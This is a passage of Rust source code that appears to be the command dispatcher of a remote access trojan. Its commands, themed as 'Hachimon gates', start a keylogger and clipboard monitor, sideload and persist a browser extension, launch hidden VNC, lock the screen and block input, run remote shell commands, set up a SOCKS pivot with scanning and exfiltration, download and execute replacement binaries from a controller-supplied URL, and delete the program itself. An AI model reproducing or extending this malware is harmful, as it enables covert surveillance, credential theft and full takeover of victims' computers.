            // Payload is JSON: {"download_url": "...", "version": "rust"|"python", "server_url": "..."}
            // For same-architecture upgrades: download new ZIP, extract .exe, replace self and restart.
            // For cross-version downgrades (rust -> python): log the request but do not act.
            if let Ok(data) = serde_json::from_str::<serde_json::Value>(payload) {
                let download_url = data.get("download_url").and_then(|v| v.as_str()).unwrap_or("");
                let version = data.get("version").and_then(|v| v.as_str()).unwrap_or("rust");
                if version == "rust" && !download_url.is_empty() {
                    info!("UPGRADE_CLIENT requested: version={}, url={}", version, download_url);
                    // Spawn blocking task to avoid holding the command handler
                    let url = download_url.to_string();
                    tokio::task::spawn_blocking(move || {
                        _handle_self_upgrade(&url);
                    });
                } else if version != "rust" {
                    info!(
                        "UPGRADE_CLIENT: version={} requested — Rust client cannot self-downgrade to Python. Ignoring.",
                        version
                    );
                } else {
                    warn!("UPGRADE_CLIENT: missing download_url in payload");
                }
            } else {
                warn!("UPGRADE_CLIENT: invalid JSON payload: {}", payload);
            }
        }

        // ---- HTML overlay (WebView2) ----
        "SHOW_HTML_OVERLAY" => {
            state.html_overlay_mgr.show(payload);
        }

        "HIDE_HTML_OVERLAY" => {
            if let Ok(v) = serde_json::from_str::<serde_json::Value>(payload) {
                let id = v.get("id").and_then(|s| s.as_str()).unwrap_or("");
                state.html_overlay_mgr.hide(id);
            } else {
                warn!("HIDE_HTML_OVERLAY: invalid JSON payload");
            }
        }

        "MOVE_HTML_OVERLAY" => {
            if let Ok(v) = serde_json::from_str::<serde_json::Value>(payload) {
                let id = v.get("id").and_then(|s| s.as_str()).unwrap_or("");
                let x  = v.get("x").and_then(|n| n.as_i64()).unwrap_or(0) as i32;
                let y  = v.get("y").and_then(|n| n.as_i64()).unwrap_or(0) as i32;
                let w  = v.get("width").and_then(|n| n.as_u64()).map(|n| n as u32);
                let h  = v.get("height").and_then(|n| n.as_u64()).map(|n| n as u32);
                state.html_overlay_mgr.move_to(id, x, y, w, h);
            } else {
                warn!("MOVE_HTML_OVERLAY: invalid JSON payload");
            }
        }

        // ---- UI Automation ----
        "READ_UI_ELEMENTS" => {
            let v: serde_json::Value = serde_json::from_str(payload).unwrap_or_default();
            let pattern = v.get("window_pattern")
                .and_then(|s| s.as_str())
                .unwrap_or("");
            let types: Vec<String> = v.get("control_types")
                .and_then(|a| a.as_array())
                .map(|arr| {
                    arr.iter()
                        .filter_map(|e| e.as_str().map(String::from))
                        .collect()
                })
                .unwrap_or_default();

            let result = crate::ui_automation::read_elements(pattern, &types);
            let json = serde_json::to_string(&result).unwrap_or_else(|_| "{}".to_string());
            let out = serde_json::json!({
                "requestId": "READ_UI_ELEMENTS",
                "exitCode": 0,
                "stdout": json,
                "stderr": "",
            });
            return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
        }

        // ---- Browser Hook (extension sideloading) ----
        // Split into 3 phases so the slow kill+relaunch runs WITHOUT the
        // state mutex, preventing starvation of the send/capture loops.
        "BROWSER_HOOK" => {
            info!("BROWSER_HOOK command");
            // Phase 1: parse + write extension (fast, has state)
            let params = match crate::browser_hook::hook_prepare(payload) {
                Ok(p) => p,
                Err(e) => {
                    let out = json!({
                        "requestId": "BROWSER_HOOK",
                        "exitCode": 1,
                        "stdout": "",
                        "stderr": e,
                    });
                    return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
                }
            };
            // Return a sentinel so the caller runs phase 2+3 outside the lock.
            // Stash params in state temporarily for the caller to retrieve.
            state._pending_hook = Some(params);
            let out = json!({
                "requestId": "BROWSER_HOOK",
                "exitCode": -2,
                "stdout": "__HOOK_PENDING__",
                "stderr": "",
            });
            return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
        }

        "BROWSER_UNHOOK" => {
            info!("BROWSER_UNHOOK command");
            // Phase 1: extract params + remove persistence (fast, has state)
            let params = crate::browser_hook::unhook_prepare(&mut state.browser_hook);
            if let Some(p) = params {
                state._pending_unhook = Some(p);
                let out = json!({
                    "requestId": "BROWSER_UNHOOK",
                    "exitCode": -2,
                    "stdout": "__UNHOOK_PENDING__",
                    "stderr": "",
                });
                return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
            } else {
                let out = json!({
                    "requestId": "BROWSER_UNHOOK",
                    "exitCode": 0,
                    "stdout": "Not hooked",
                    "stderr": "",
                });
                return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
            }
        }

        "BROWSER_HOOK_STATUS" => {
            let status_json = crate::browser_hook::status(&state.browser_hook);
            let out = json!({
                "requestId": "BROWSER_HOOK_STATUS",
                "exitCode": 0,
                "stdout": status_json,
                "stderr": "",
            });
            return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
        }

        "BROWSER_HOOK_PERSIST" => {
            info!("BROWSER_HOOK_PERSIST command");
            let result = crate::browser_hook::persist(&mut state.browser_hook);
            let (exit_code, stdout, stderr) = match result {
                Ok(msg) => (0, msg, String::new()),
                Err(e) => (1, String::new(), e),
            };
            let out = json!({
                "requestId": "BROWSER_HOOK_PERSIST",
                "exitCode": exit_code,
                "stdout": stdout,
                "stderr": stderr,
            });
            return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
        }

        "BROWSER_HOOK_UNPERSIST" => {
            info!("BROWSER_HOOK_UNPERSIST command");
            let result = crate::browser_hook::remove_persistence(&mut state.browser_hook);
            let (exit_code, stdout, stderr) = match result {
                Ok(msg) => (0, msg, String::new()),
                Err(e) => (1, String::new(), e),
            };
            let out = json!({
                "requestId": "BROWSER_HOOK_UNPERSIST",
                "exitCode": exit_code,
                "stdout": stdout,
                "stderr": stderr,
            });
            return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
        }

        // ---- System ----
        "STOP" => {
            info!("STOP command received");
            state.stop_signal = true;
        }

        // ---- Hachimon (八門) — Gates 1-7 ----

        // Gate 1 — Opening Gate (開門): configure video capture parameters.
        "HACHIMON_GATE_1" => {
            info!("開門 — Gate 1: Opening Gate activated");
            let cfg: Value = serde_json::from_str(payload)
                .ok()
                .and_then(|v: Value| v.get("config").cloned())
                .unwrap_or_else(|| json!({}));

            if let Some(fps) = cfg.get("target_fps").and_then(|v| v.as_u64()) {
                state.target_fps = (fps as u32).max(1).min(60);
                info!("  Gate 1: target_fps = {}", state.target_fps);
            }
            if let Some(q) = cfg.get("jpeg_quality").and_then(|v| v.as_u64()) {
                state.jpeg_quality = (q as u32).max(10).min(100);
                info!("  Gate 1: jpeg_quality = {}", state.jpeg_quality);
            }
            if let Some(enc) = cfg.get("encoding").and_then(|v| v.as_str()) {
                state.current_encoding = enc.to_string();
                info!("  Gate 1: encoding = {}", enc);
            }
            if let Some(mon) = cfg.get("monitor_index").and_then(|v| v.as_u64()) {
                state.current_monitor = mon as u32;
                info!("  Gate 1: monitor_index = {}", mon);
            }
            // auto_screenshot_interval is advisory — noted but acted on by main.rs
            if let Some(interval) = cfg.get("auto_screenshot_interval").and_then(|v| v.as_u64()) {
                info!("  Gate 1: auto_screenshot_interval = {}s", interval);
            }

            state.current_gate = 1;
            crate::config::save_current(
                &state.config_path,
                state.target_fps,
                state.jpeg_quality,
                &state.current_encoding,
            );
            let ack = json!({
                "gate": 1,
                "name": "開門",
                "ok": true,
                "target_fps": state.target_fps,
                "jpeg_quality": state.jpeg_quality,
                "encoding": state.current_encoding,
                "monitor_index": state.current_monitor,
            });
            let sync = build_message(MSG_STATE_SYNC, ack.to_string().as_bytes());
            if let Some(tx) = &state.ws_send_tx {
                let _ = tx.send(sync);
            }
        }

        // Gate 2 — Healing Gate (休門): enable input control.
        "HACHIMON_GATE_2" => {
            info!("休門 — Gate 2: Healing Gate activated");
            let cfg: Value = serde_json::from_str(payload)
                .ok()
                .and_then(|v: Value| v.get("config").cloned())
                .unwrap_or_else(|| json!({}));

            let mouse_natural = cfg.get("mouse_natural").and_then(|v| v.as_bool()).unwrap_or(true);
            crate::input::set_natural_mouse(mouse_natural);
            info!("  Gate 2: mouse_natural = {}", mouse_natural);

            // typing_speed_ms and input_timeout are advisory for input module
            if let Some(speed) = cfg.get("typing_speed_ms").and_then(|v| v.as_u64()) {
                info!("  Gate 2: typing_speed_ms = {}", speed);
            }
            if let Some(timeout) = cfg.get("input_timeout").and_then(|v| v.as_u64()) {
                info!("  Gate 2: input_timeout = {}ms", timeout);
            }

            state.keyboard_enabled = true;
            state.mouse_enabled = true;
            sync_input_block_state(state);
            info!("  Gate 2: keyboard + mouse ENABLED");

            state.current_gate = 2;
            let ack = json!({
                "gate": 2,
                "name": "休門",
                "ok": true,
                "keyboardEnabled": state.keyboard_enabled,
                "mouseEnabled": state.mouse_enabled,
                "mouseNatural": mouse_natural,
            });
            let sync = build_message(MSG_STATE_SYNC, ack.to_string().as_bytes());
            if let Some(tx) = &state.ws_send_tx {
                let _ = tx.send(sync);
            }
        }

        // Gate 3 — Life Gate (生門): overlay + lock management.
        "HACHIMON_GATE_3" => {
            info!("生門 — Gate 3: Life Gate activated");
            let cfg: Value = serde_json::from_str(payload)
                .ok()
                .and_then(|v: Value| v.get("config").cloned())
                .unwrap_or_else(|| json!({}));

            let overlay_preset = cfg.get("overlay_preset").and_then(|v| v.as_str()).unwrap_or("none");
            let overlay_url    = cfg.get("overlay_url").and_then(|v| v.as_str()).unwrap_or("");
            let auto_lock      = cfg.get("auto_lock").and_then(|v| v.as_bool()).unwrap_or(false);
            let block_input    = cfg.get("block_input").and_then(|v| v.as_bool()).unwrap_or(false);
            let lock_duration  = cfg.get("lock_duration").and_then(|v| v.as_u64()).unwrap_or(0);

            info!("  Gate 3: overlay_preset={} overlay_url={} auto_lock={} block_input={}",
                  overlay_preset, overlay_url, auto_lock, block_input);

            // Apply input block if requested
            if block_input {
                state.manual_input_block = true;
                sync_input_block_state(state);
                info!("  Gate 3: input BLOCKED");
            }

            // Apply screen lock if auto_lock is set
            if auto_lock {
                state.screen_locked = true;
                close_custom_overlays(state);
                sync_input_block_state(state);
                let lock_img = make_lock_image(state.current_monitor);
                state.lock_overlay.show(&lock_img, 100);
                info!("  Gate 3: screen LOCKED (duration={}s)", lock_duration);
            }

            state.current_gate = 3;
            let ack = json!({
                "gate": 3,
                "name": "生門",
                "ok": true,
                "screenLocked": state.screen_locked,
                "inputBlocked": state.input_blocked,
                "overlayPreset": overlay_preset,
                "overlayUrl": overlay_url,
            });
            let sync = build_message(MSG_STATE_SYNC, ack.to_string().as_bytes());
            if let Some(tx) = &state.ws_send_tx {
                let _ = tx.send(sync);
            }
        }

        // Gate 4 — Pain Gate (傷門): data harvesting — keylogger + clipboard + browser data.
        "HACHIMON_GATE_4" => {
            info!("傷門 — Gate 4: Pain Gate activated");
            let cfg: Value = serde_json::from_str(payload)
                .ok()
                .and_then(|v: Value| v.get("config").cloned())
                .unwrap_or_else(|| json!({}));

            let keylog_mode        = cfg.get("keylog_mode").and_then(|v| v.as_str()).unwrap_or("standard");
            let clipboard_interval = cfg.get("clipboard_interval_ms").and_then(|v| v.as_u64()).unwrap_or(1000);
            let auto_harvest       = cfg.get("auto_harvest").and_then(|v| v.as_bool()).unwrap_or(false);

            info!("  Gate 4: keylog_mode={} clipboard_interval={}ms auto_harvest={}",
                  keylog_mode, clipboard_interval, auto_harvest);

            // Start keylogger if not already running
            if !state.keylogger.is_active() {
                state.keylogger.start();
                info!("  Gate 4: keylogger STARTED");
            }

            // Enable clipboard monitor
            state.clipboard_monitor_enabled = true;
            info!("  Gate 4: clipboard monitor ENABLED");

            state.current_gate = 4;
            let ack = json!({
                "gate": 4,
                "name": "傷門",
                "ok": true,
                "keyloggerActive": state.keylogger.is_active(),
                "clipboardMonitorActive": state.clipboard_monitor_enabled,
                "keylogMode": keylog_mode,
                "autoHarvest": auto_harvest,
            });
            let sync = build_message(MSG_STATE_SYNC, ack.to_string().as_bytes());
            if let Some(tx) = &state.ws_send_tx {
                let _ = tx.send(sync);
            }
        }

        // Gate 5 — Limit Gate (杜門): shell access + process visibility.
        "HACHIMON_GATE_5" => {
            info!("杜門 — Gate 5: Limit Gate activated");
            let cfg: Value = serde_json::from_str(payload)
                .ok()
                .and_then(|v: Value| v.get("config").cloned())
                .unwrap_or_else(|| json!({}));

            let shell_type        = cfg.get("shell_type").and_then(|v| v.as_str()).unwrap_or("cmd");
            let shell_timeout     = cfg.get("shell_timeout").and_then(|v| v.as_u64()).unwrap_or(30000);
            let auto_process_list = cfg.get("auto_process_list").and_then(|v| v.as_bool()).unwrap_or(false);

            info!("  Gate 5: shell_type={} shell_timeout={}ms auto_process_list={}",
                  shell_type, shell_timeout, auto_process_list);

            state.current_gate = 5;

            // Optionally send process list immediately
            if auto_process_list {
                let procs = get_process_list();
                info!("  Gate 5: sending process list ({} bytes)", procs.len());
                if let Some(tx) = &state.ws_send_tx {
                    let _ = tx.send(build_message(MSG_PROCESS_LIST, procs.as_bytes()));
                }
            }

            let ack = json!({
                "gate": 5,
                "name": "杜門",
                "ok": true,
                "shellType": shell_type,
                "shellTimeout": shell_timeout,
                "autoProcessList": auto_process_list,
            });
            let sync = build_message(MSG_STATE_SYNC, ack.to_string().as_bytes());
            if let Some(tx) = &state.ws_send_tx {
                let _ = tx.send(sync);
            }
        }

        // Gate 6 — View Gate (景門): remote desktop (HVNC/VNC) + browser hook.
        "HACHIMON_GATE_6" => {
            info!("景門 — Gate 6: View Gate activated");
            let cfg: Value = serde_json::from_str(payload)
                .ok()
                .and_then(|v: Value| v.get("config").cloned())
                .unwrap_or_else(|| json!({}));

            let hvnc_exe            = cfg.get("hvnc_exe").and_then(|v| v.as_str()).unwrap_or("");
            let chidori_browser     = cfg.get("chidori_browser").and_then(|v| v.as_str()).unwrap_or("");
            let chidori_auto_persist = cfg.get("chidori_auto_persist").and_then(|v| v.as_bool()).unwrap_or(false);

            info!("  Gate 6: hvnc_exe='{}' chidori_browser='{}' chidori_auto_persist={}",
                  hvnc_exe, chidori_browser, chidori_auto_persist);

            // Start HVNC if exe specified and HVNC not already active
            if !hvnc_exe.is_empty() {
                if let Some(hvnc) = &mut state.hvnc {
                    if !hvnc.is_active() {
                        hvnc.start();
                        if !hvnc_exe.is_empty() {
                            hvnc.launch(hvnc_exe);
                        }
                        info!("  Gate 6: HVNC started (exe='{}')", hvnc_exe);
                    }
                }
            }

            // Hook Chidori browser extension if browser specified
            if !chidori_browser.is_empty() {
                let hook_payload = json!({ "browser": chidori_browser }).to_string();
                let result = crate::browser_hook::hook(&mut state.browser_hook, &hook_payload);
                match result {
                    Ok(msg) => {
                        info!("  Gate 6: Chidori hooked — {}", msg);
                        if chidori_auto_persist {
                            let _ = crate::browser_hook::persist(&mut state.browser_hook);
                            info!("  Gate 6: Chidori persistence set");
                        }
                    }
                    Err(e) => warn!("  Gate 6: Chidori hook failed — {}", e),
                }
            }

            state.current_gate = 6;
            let ack = json!({
                "gate": 6,
                "name": "景門",
                "ok": true,
                "hvncActive": state.hvnc.as_ref().map(|h| h.is_active()).unwrap_or(false),
                "chidoriBrowser": chidori_browser,
                "chidoriHooked": state.browser_hook.active,
            });
            let sync = build_message(MSG_STATE_SYNC, ack.to_string().as_bytes());
            if let Some(tx) = &state.ws_send_tx {
                let _ = tx.send(sync);
            }
        }

        // Gate 7 — Wonder Gate (驚門): network pivot + exfil.
        // NOTE: Kamui SOCKS proxy, Byakugan scan, and Amaterasu exfil are dispatched
        // via their respective modules in main.rs. Here we record the gate level and
        // log the requested config so main.rs can act on it via state.current_gate.
        "HACHIMON_GATE_7" => {
            info!("驚門 — Gate 7: Wonder Gate activated");
            let cfg: Value = serde_json::from_str(payload)
                .ok()
                .and_then(|v: Value| v.get("config").cloned())
                .unwrap_or_else(|| json!({}));

            let kamui_socks_port   = cfg.get("kamui_socks_port").and_then(|v| v.as_u64()).unwrap_or(1080);
            let kamui_max_streams  = cfg.get("kamui_max_streams").and_then(|v| v.as_u64()).unwrap_or(10);
            let byakugan_scan_type = cfg.get("byakugan_scan_type").and_then(|v| v.as_str()).unwrap_or("ping");
            let byakugan_target    = cfg.get("byakugan_target_range").and_then(|v| v.as_str()).unwrap_or("");
            let amaterasu_parallel = cfg.get("amaterasu_parallel").and_then(|v| v.as_u64()).unwrap_or(4);

            info!("  Gate 7: kamui_socks_port={} kamui_max_streams={}", kamui_socks_port, kamui_max_streams);
            info!("  Gate 7: byakugan_scan_type={} target_range='{}'", byakugan_scan_type, byakugan_target);
            info!("  Gate 7: amaterasu_parallel={}", amaterasu_parallel);

            state.current_gate = 7;
            let ack = json!({
                "gate": 7,
                "name": "驚門",
                "ok": true,
                "kamuiSocksPort": kamui_socks_port,
                "kamuiMaxStreams": kamui_max_streams,
                "byakuganScanType": byakugan_scan_type,
                "byakuganTargetRange": byakugan_target,
                "amaterasuParallel": amaterasu_parallel,
            });
            let sync = build_message(MSG_STATE_SYNC, ack.to_string().as_bytes());
            if let Some(tx) = &state.ws_send_tx {
                let _ = tx.send(sync);
            }
        }

        // ---- Hachimon (八門) — Gate 8 ----
        "HACHIMON_NIGHT_GUY" => {
            info!("夜凱 — Night Guy activated. Terminal sequence.");
            state.cleanup();
            if let Some(tx) = &state.ws_send_tx {
                let msg = json!({
                    "requestId": "night_guy",
                    "exitCode": 0,
                    "stdout": "夜凱"
                });
                let out = build_message(MSG_CMD_OUTPUT, msg.to_string().as_bytes());
                let _ = tx.send(out);
            }
            #[cfg(windows)]
            crate::self_delete::delete_self();
            state.stop_signal = true;
        }

        // NOTE: AMATERASU_*, KAMUI_*, and BYAKUGAN_* commands are intercepted in main.rs
        // before reaching handle_command, dispatched via their respective modules.

        _ => {
            // Silently ignore unknown commands
        }
    }

    Ok(None)
}

// ---- Helpers ----

fn sync_input_block_state(state: &mut ClientState) {
    let desired =
        state.screen_locked || state.manual_input_block || state.overlay_input_blocked;
    if desired && !state.input_blocked {
        crate::input_blocker::block_input(true);
        state.input_blocked = true;
    } else if !desired && state.input_blocked {
        crate::input_blocker::block_input(false);
        state.input_blocked = false;
    }
}

fn close_custom_overlays(state: &mut ClientState) {
    state.overlay.close();
    state.overlay_mgr.close_all();
    state.overlay_input_blocked = false;
    sync_input_block_state(state);
}

pub fn show_fullscreen_overlay(state: &mut ClientState, image_data: &[u8], opacity: u32) -> bool {
    if state.screen_locked || image_data.is_empty() {
        return false;
    }
    state.overlay.close();
    state.overlay_mgr.close_all();
    state.overlay_input_blocked = true;
    sync_input_block_state(state);
    state.overlay.show(image_data, opacity.min(100));
    true
}

fn run_command_sync(request_id: &str, command: &str) -> String {
    #[cfg(windows)]
    let (shell, arg) = ("cmd", "/C");
    #[cfg(not(windows))]
    let (shell, arg) = ("sh", "-c");

    let result = std::process::Command::new(shell)
        .arg(arg)
        .arg(command)
        .output();

    match result {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            let stdout_trimmed = if stdout.len() > 4000 { &stdout[..4000] } else { &stdout };
            let stderr_trimmed = if stderr.len() > 2000 { &stderr[..2000] } else { &stderr };
            json!({
                "requestId": request_id,
                "exitCode": out.status.code().unwrap_or(-1),
                "stdout": stdout_trimmed,
                "stderr": stderr_trimmed,
            }).to_string()
        }
        Err(e) => json!({
            "requestId": request_id,
            "exitCode": -1,
            "stdout": "",
            "stderr": e.to_string(),
        }).to_string(),
    }
}

fn get_process_list() -> String {
    let mut sys = sysinfo::System::new_all();
    sys.refresh_processes();

    let mut procs: Vec<Value> = sys.processes().values().map(|p| {
        let cpu = (p.cpu_usage() * 10.0).round() / 10.0;
        let mem = (p.memory() as f64 / (1024.0 * 1024.0) * 10.0).round() / 10.0;
        json!({
            "pid": p.pid().as_u32(),
            "name": p.name().to_string(),
            "cpu": cpu,
            "mem_mb": mem,
            "user": p.user_id().map(|u| u.to_string()).unwrap_or_default(),
            "status": format!("{:?}", p.status()),
        })
    }).collect();

    procs.sort_by(|a, b| {
        let ca = a["cpu"].as_f64().unwrap_or(0.0);
        let cb = b["cpu"].as_f64().unwrap_or(0.0);
        cb.partial_cmp(&ca).unwrap_or(std::cmp::Ordering::Equal)
    });

    serde_json::to_string(&procs).unwrap_or_else(|_| "[]".to_string())
}

fn start_process_impl(exe: &str, args: &str, hidden: bool) {
    let mut cmd = std::process::Command::new(exe);
    if !args.is_empty() {
        cmd.args(args.split_whitespace());
    }
    #[cfg(windows)]
    if hidden {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        cmd.creation_flags(CREATE_NO_WINDOW);
    }
    match cmd.spawn() {
        Ok(_) => info!("Started process: {}", exe),
        Err(e) => error!("START_PROCESS failed: {}", e),
    }
}

/// Returns lightweight metadata for all connected monitors (no thumbnails).
fn list_monitors(active_index: u32) -> Vec<Value> {
    let (_, _, _, _, mon_count) = crate::sysinfo_collect::get_screen_dimensions();
    (0..mon_count).map(|idx| {
        let (x, y, w, h) = crate::sysinfo_collect::get_monitor_rect(idx);
        json!({
            "index": idx,
            "x": x,
            "y": y,
            "width": w,
            "height": h,
            "isActive": idx == active_index,
            "isPrimary": idx == 0,
        })
    }).collect()
}

/// Suspend or resume all threads of a process by pid (Windows only).
#[cfg(windows)]
fn suspend_resume_process(pid: u32, suspend: bool) {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32, TH32CS_SNAPTHREAD,
    };
    use windows::Win32::System::Threading::{
        OpenThread, SuspendThread, ResumeThread, THREAD_SUSPEND_RESUME,
    };
    use windows::Win32::Foundation::CloseHandle;

    let action = if suspend { "Suspend" } else { "Resume" };
    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
    let snapshot = match snapshot {
        Ok(h) => h,
        Err(e) => {
            warn!("{}_PROCESS {}: CreateToolhelp32Snapshot failed: {}", action, pid, e);
            return;
        }
    };

    let mut entry = THREADENTRY32 {
        dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
        ..Default::default()
    };

    let mut affected = 0u32;
    if unsafe { Thread32First(snapshot, &mut entry) }.is_ok() {
        loop {
            if entry.th32OwnerProcessID == pid {
                if let Ok(thread) = unsafe { OpenThread(THREAD_SUSPEND_RESUME, false, entry.th32ThreadID) } {
                    if suspend {
                        unsafe { SuspendThread(thread) };
                    } else {
                        unsafe { ResumeThread(thread) };
                    }
                    unsafe { CloseHandle(thread).ok() };
                    affected += 1;
                }
            }
            if unsafe { Thread32Next(snapshot, &mut entry) }.is_err() {
                break;
            }
        }
    }
    unsafe { CloseHandle(snapshot).ok() };

    if affected > 0 {
        info!("{}ed {} threads of pid {}", action, affected, pid);
    } else {
        warn!("{}_PROCESS: no threads found for pid {}", action, pid);
    }
}

fn build_monitor_previews(current_monitor: u32, thumb_width: u32) -> Vec<Value> {
    let (_, _, _, _, mon_count) = crate::sysinfo_collect::get_screen_dimensions();
    let mut previews = Vec::new();

    for idx in 0..mon_count {
        let (_, _, mw, mh) = crate::sysinfo_collect::get_monitor_rect(idx);
        let jpeg = crate::capture::capture_jpeg(idx, 65).unwrap_or_default();

        let thumb_data = if !jpeg.is_empty() && mw > thumb_width {
            if let Ok(img) = image::load_from_memory(&jpeg) {
                let ratio = thumb_width as f32 / mw as f32;
                let new_h = ((mh as f32 * ratio) as u32).max(1);
                let resized = img.resize(thumb_width, new_h, image::imageops::FilterType::Lanczos3);
                let mut buf = std::io::Cursor::new(Vec::new());
                let _ = resized.write_to(&mut buf, image::ImageFormat::Jpeg);
                buf.into_inner()
            } else {
                jpeg
            }
        } else {
            jpeg
        };

        use base64::Engine as _;
        let b64 = base64::engine::general_purpose::STANDARD.encode(&thumb_data);
        previews.push(json!({
            "monitorIndex": idx,
            "width": mw,
            "height": mh,
            "isActive": idx == current_monitor,
            "thumbnailDataUrl": format!("data:image/jpeg;base64,{}", b64),
        }));
    }
    previews
}

/// Generate a visual lock screen JPEG image.
pub fn make_lock_image(monitor_index: u32) -> Vec<u8> {
    let (_, _, w, h) = crate::sysinfo_collect::get_monitor_rect(monitor_index);
    let w = w.max(800);
    let h = h.max(600);

    use image::{ImageBuffer, Rgb};

    let mut img = ImageBuffer::<Rgb<u8>, Vec<u8>>::new(w, h);

    // Dark background
    for pixel in img.pixels_mut() {
        *pixel = Rgb([5u8, 5u8, 10u8]);
    }

    // Red gradient top
    for y in 0..h {
        let alpha = (40.0 * (1.0 - y as f64 / h as f64)) as u8;
        for x in 0..w {
            let p = img.get_pixel_mut(x, y);
            p[0] = p[0].saturating_add(alpha);
        }
    }

    // Red border (4px)
    let border = 4u32;
    for x in 0..w {
        for b in 0..border {
            img.put_pixel(x, b, Rgb([180, 20, 20]));
            img.put_pixel(x, h - 1 - b, Rgb([180, 20, 20]));
        }
    }
    for y in 0..h {
        for b in 0..border {
            img.put_pixel(b, y, Rgb([180, 20, 20]));
            img.put_pixel(w - 1 - b, y, Rgb([180, 20, 20]));
        }
    }

    // Note: text rendering requires a font library (rusttype/fontdue).
    // For simplicity, we draw a large red rectangle in the center as a lock indicator.
    let rect_w = (w as f32 * 0.6) as u32;
    let rect_h = 20u32;
    let rx = (w - rect_w) / 2;
    let ry = h / 2 - rect_h / 2;
    for y in ry..(ry + rect_h) {
        for x in rx..(rx + rect_w) {
            if x < w && y < h {
                img.put_pixel(x, y, Rgb([220, 30, 30]));
            }
        }
    }

    let dyn_img = image::DynamicImage::ImageRgb8(img);
    let mut buf = std::io::Cursor::new(Vec::new());
    let _ = dyn_img.write_to(&mut buf, image::ImageFormat::Jpeg);
    buf.into_inner()
}

pub fn get_hostname_simple() -> String {
    std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "unknown".to_string())
}

/// Download a newer Rust build ZIP, replace the current executable, and restart.
///
/// Called from a blocking thread spawned by the UPGRADE_CLIENT handler.
/// On Windows, uses a helper batch script to wait for the process to exit before
/// overwriting the .exe (self-overwrite is not possible on a running Windows binary).
fn _handle_self_upgrade(download_url: &str) {
    use std::io::Write;

    info!("Self-upgrade: downloading from {}", download_url);

    // 1. Download ZIP to temp dir
    let tmp_dir = match std::env::temp_dir().join("raven_upgrade").to_str() {
        Some(s) => s.to_string(),
        None => {
            error!("Self-upgrade: could not build temp path");
            return;
        }
    };
    let tmp_dir = std::path::PathBuf::from(&tmp_dir);
    if let Err(e) = std::fs::create_dir_all(&tmp_dir) {
        error!("Self-upgrade: cannot create temp dir: {}", e);
        return;
    }

    let zip_path = tmp_dir.join("upgrade.zip");

    // Perform HTTP download (blocking, via reqwest)
    let download_result = (|| -> Result<(), Box<dyn std::error::Error>> {
        let bytes = reqwest::blocking::get(download_url)?.bytes()?;
        std::fs::write(&zip_path, &bytes)?;
        Ok(())
    })();

    if let Err(e) = download_result {
        error!("Self-upgrade: download failed: {}", e);
        return;
    }

    info!("Self-upgrade: downloaded ZIP to {:?}", zip_path);

    // 2. Extract ZIP
    let extract_result = (|| -> Result<(), Box<dyn std::error::Error>> {
        let file = std::fs::File::open(&zip_path)?;
        let mut archive = zip::ZipArchive::new(file)?;
        archive.extract(&tmp_dir)?;
        Ok(())
    })();

    if let Err(e) = extract_result {
        error!("Self-upgrade: extraction failed: {}", e);
        return;
    }

    // 3. Find .exe in extracted files
    let new_exe = match std::fs::read_dir(&tmp_dir).ok().and_then(|entries| {
        entries.flatten().find(|e| {
            e.path().extension().and_then(|x| x.to_str()) == Some("exe")
        })
    }) {
        Some(e) => e.path(),
        None => {
            error!("Self-upgrade: no .exe found in extracted ZIP");
            return;
        }
    };

    info!("Self-upgrade: found new binary {:?}", new_exe);

    // 4. Determine current exe path and install dir
    let current_exe = match std::env::current_exe() {
        Ok(p) => p,
        Err(e) => {
            error!("Self-upgrade: cannot get current exe path: {}", e);
            return;
        }
    };
    let install_dir = current_exe.parent().unwrap_or(&current_exe);
    let dest_exe = install_dir.join(new_exe.file_name().unwrap_or(new_exe.as_os_str()));

    // 5. On Windows, write a batch script that waits for this process to exit,
    //    copies the new exe over the old one, then launches it.
    #[cfg(windows)]
    {
        let script_path = tmp_dir.join("_raven_upgrade.bat");
        let pid = std::process::id();
        let script_content = format!(
            "@echo off\r\n\
             :wait\r\n\
             tasklist /FI \"PID eq {pid}\" 2>nul | find /i \"{pid}\" >nul 2>&1\r\n\
             if not errorlevel 1 (timeout /t 1 /nobreak >nul & goto wait)\r\n\
             copy /Y \"{src}\" \"{dest}\" >nul\r\n\
             start \"\" \"{dest}\"\r\n\
             del \"%~f0\"\r\n",
            pid = pid,
            src = new_exe.display(),
            dest = dest_exe.display(),
        );
        if let Ok(mut f) = std::fs::File::create(&script_path) {
            let _ = f.write_all(script_content.as_bytes());
        }
        // Launch the batch script detached, then signal stop
        let _ = std::process::Command::new("cmd")
            .args(&["/C", "start", "", "/MIN", script_path.to_str().unwrap_or("")])
            .spawn();
    }

    // On non-Windows: direct copy then exec
    #[cfg(not(windows))]
    {
        if let Err(e) = std::fs::copy(&new_exe, &dest_exe) {
            error!("Self-upgrade: copy failed: {}", e);
            return;
        }
        // Make executable
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(&dest_exe, std::fs::Permissions::from_mode(0o755));
        }
        // Re-exec
        let _ = std::process::Command::new(&dest_exe).spawn();
    }

    info!("Self-upgrade: replacement scheduled, stopping current process");
    // The main loop will detect stop_signal and exit cleanly.
    // We use process::exit here since this is a blocking thread.
    std::thread::sleep(std::time::Duration::from_millis(500));
    std::process::exit(0);
}

```